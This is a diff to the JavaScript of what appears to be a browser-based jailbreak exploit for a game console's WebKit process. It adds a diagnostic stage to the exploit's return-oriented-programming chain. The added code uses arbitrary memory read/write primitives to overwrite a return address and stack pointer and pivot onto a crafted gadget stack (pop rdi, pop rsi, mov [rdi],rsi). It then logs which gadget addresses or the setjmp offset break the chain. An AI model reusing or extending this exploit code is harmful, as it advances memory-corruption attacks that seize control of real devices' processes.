@@ -204,6 +204,16 @@ function crumbsTake() {
 
 async function prepare(p) {
 
+    const attempts = (function () {
+        try { return JSON.parse(localStorage.getItem("slopkit-probe-tries") || "{}"); }
+        catch (e) { return {}; }
+    })();
+    const noteAttempt = (k) => {
+        attempts[k] = (attempts[k] || 0) + 1;
+        try { localStorage.setItem("slopkit-probe-tries", JSON.stringify(attempts)); }
+        catch (e) {  }
+    };
+
     const prevCrumbs = crumbsTake();
     if (prevCrumbs) {
         const parts = prevCrumbs.split(">");
@@ -223,7 +233,8 @@ async function prepare(p) {
            first sent a run that had already reached probe=sj back to
            probe=pivot. Rank the stages and advance from the highest seen. */
         const stageOf = (x) =>
-            x.indexOf("probe-sj") === 0 ? 3
+            x.indexOf("probe-sj") === 0 ? 4
+            : x.indexOf("probe-w") === 0 ? 3
             : x.indexOf("probe-rsp") === 0 ? 2
             : x.indexOf("probe-pivot") === 0 ? 1 : 0;
         const maxStage = parts.reduce((m, x) => Math.max(m, stageOf(x)), 0);
@@ -233,16 +244,41 @@ async function prepare(p) {
         const sjFinished = parts.some(x => x.indexOf("probe-sj-SILENT") === 0
             || x.indexOf("probe-sj-ANSWERED") === 0);
 
-        if (!PROBE && maxStage === 3 && !sjFinished) {
+        const wFinished = parts.some(x => x.indexOf("probe-w-SILENT") === 0
+            || x.indexOf("probe-w-ANSWERED") === 0);
+        if (!PROBE && maxStage === 3 && !wFinished && (attempts["w"] || 0) >= 2) {
+            jbmark("PROBE-VERDICT", "probe=w has now CRASHED twice without"
+                + " reporting. It runs only pop rdi / pop rsi / mov [rdi],rsi"
+                + " then infloop, and probe=rsp proved the pivot and stack"
+                + " switch, so one of those three gadget addresses in offsets/"
+                + window.fw_str + ".js is wrong. Re-derive them.");
+        } else if (!PROBE && maxStage === 4 && !sjFinished
+            && (attempts["sj"] || 0) >= 2 && wFinished) {
+            jbmark("PROBE-VERDICT", "probe=sj has CRASHED twice while probe=w"
+                + " reported cleanly, so the write gadgets are fine and setjmp"
+                + " (libc+0x" + OFFSET_lc_setjmp.toString(16) + ") is the"
+                + " culprit -- wrong address, or not setjmp at all.");
+        } else if (!PROBE && maxStage === 4 && !sjFinished) {
+            /* probe=sj = probe=rsp + write gadgets + setjmp, and it crashed
+               rather than reporting. Drop back one rung and run the writes on
+               their own, which separates the two. */
+            PROBE = "w";
+            jbmark("PROBE-AUTO", "probe=sj CRASHED instead of reporting, so the"
+                + " fault is in the write gadgets or setjmp -- dropping to"
+                + " probe=w, which runs the writes alone");
+        } else if (!PROBE && maxStage === 3 && !parts.some(x =>
+            x.indexOf("probe-w-SILENT") === 0 || x.indexOf("probe-w-ANSWERED") === 0)) {
+            PROBE = "w";
+            jbmark("PROBE-AUTO", "probe=w was interrupted -- repeating it");
+        } else if (!PROBE && maxStage === 3) {
             PROBE = "sj";
-            jbmark("PROBE-AUTO", "probe=sj was interrupted before it could read"
-                + " its results back (trail ends mid-wait) -- repeating it."
-                + " It parks the worker and then reports; let it finish.");
+            jbmark("PROBE-AUTO", "the write gadgets are settled -- re-running"
+                + " probe=sj to read the jmp_buf back");
         } else if (!PROBE && maxStage === 2 && sawSilent("probe-rsp")) {
-            PROBE = "sj";
+            PROBE = "w";
             jbmark("PROBE-AUTO", "pop rsp and the stack switch both work, so the"
-                + " fault is the write gadgets or setjmp/longjmp -- escalating to"
-                + " probe=sj, which runs both and reads the results back");
+                + " fault is the write gadgets or setjmp -- escalating to probe=w,"
+                + " which tests the writes alone");
         } else if (!PROBE && maxStage === 1 && sawSilent("probe-pivot")) {
             PROBE = "rsp";
             jbmark("PROBE-AUTO", "the hijacked return address executes cleanly"
@@ -259,6 +295,7 @@ async function prepare(p) {
                 + "' -- that stage is the culprit; see its comment in main.js");
         }
     }
+    if (PROBE) noteAttempt(PROBE);
     crumb("prep");
 
     let textArea = document.createElement("textarea");
@@ -319,6 +356,14 @@ async function prepare(p) {
     for (let sysc in syscall_map) {
         syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);
     }
+
+    /* No gadget byte audit is possible here: libSceNKWebKit .text is
+       EXECUTE-ONLY on this build (confirmed on hardware), and a read of an
+       execute-only page faults the WebProcess rather than throwing. Gadgets
+       can therefore only be tested by running them, which is what the probe
+       ladder below does -- one gadget group per run. */
+    jbmark("GADGET-AUDIT", "skipped: libSceNKWebKit text is execute-only,"
+        + " gadgets can only be validated by executing them");
 
     let nogc = [];
 
@@ -788,6 +833,61 @@ async function prepare(p) {
                 + "-poprsp=0x" + gadgets["pop rsp"].toString()
                 + "-rsp=0x" + chain.stack_entry_point.toString());
 
+        if (PROBE === "w") {
+            /* probe=sj crashed, and it is probe=rsp (which works) plus two
+               things: the write gadgets and setjmp. Run ONLY the writes and
+               park. Silent => the three gadgets are fine and setjmp is the
+               culprit. Crash => one of pop rdi / pop rsi / mov [rdi],rsi is
+               wrong, and the value left in scratch says how far it got. */
+            const scratch = malloc(0x40);
+            const stk = malloc(0x200);
+            const MAGIC = new int64(0x13371337, 0x0BADF00D);
+            p.write8(scratch, new int64(0, 0));
+            let i = 0;
+            const put = (v) => { p.write8(stk.add32(i * 8), v); i++; };
+            put(gadgets["pop rdi"]); put(scratch);
+            put(gadgets["pop rsi"]); put(MAGIC);
+            put(gadgets["mov [rdi], rsi"]);
+            put(gadgets["infloop"]);
+
+            crumb("probe-w-w1");
+            p.write8(return_address_ptr, gadgets["pop rsp"]);
+            p.write8(stack_pointer_ptr, stk);
+            crumb("probe-w-armed");
+            jbmark("PROBE-WAIT", "probe=w armed -- about a second, do NOT reload");
+            const ans = await new Promise((resolve) => {
+                let done = false;
+                const finish = (v) => { if (!done) { done = true; resolve(v); } };
+                worker.onmessage = function () { finish(true); };
+                crumb("probe-w-pm");
+                worker.postMessage(0);
+                let n = 0;
+                const iv = setInterval(() => {
+                    const v = p.read8(scratch);
+                    if ((v.low === MAGIC.low && v.hi === MAGIC.hi) || ++n > 30) {
+                        clearInterval(iv); finish(false);
+                    }
+                }, 100);
+            });
+            const got = p.read8(scratch);
+            const wroteOK = got.low === MAGIC.low && got.hi === MAGIC.hi;
+            crumb("probe-w-" + (ans ? "ANSWERED" : "SILENT") + (wroteOK ? "-wOK" : "-wBAD"));
+            jbmark("PROBE-W", "write=" + (wroteOK ? "ok" : "FAILED")
+                + "-scratch=0x" + got.toString());
+            throw new Error("probe=w: the three write gadgets "
+                + (wroteOK
+                    ? "WORK -- scratch holds MAGIC, so pop rdi (0x"
+                    + wk_gadgetmap["pop rdi"].toString(16) + "), pop rsi (0x"
+                    + wk_gadgetmap["pop rsi"].toString(16) + ") and mov [rdi],rsi"
+                    + " (0x" + wk_gadgetmap["mov [rdi], rsi"].toString(16)
+                    + ") are all correct. By elimination setjmp (libc+0x"
+                    + OFFSET_lc_setjmp.toString(16) + ") is what kills the chain."
+                    : "FAILED -- scratch = 0x" + got.toString() + " instead of"
+                    + " MAGIC, so one of pop rdi / pop rsi / mov [rdi],rsi is not"
+                    + " the instruction the profile claims")
+                + ". Worker is spinning; reload.");
+        }
+
         if (PROBE === "sj") {
             /* Everything up to and including the stack switch is proven, and a
                parked worker lets us read memory back afterwards -- so run the
@@ -1025,4 +1125,4 @@ let fwScript = document.createElement('script');
 document.body.appendChild(fwScript);
 
 window.__offsetsScript = fwScript;
-fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=28`);
+fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=29`);
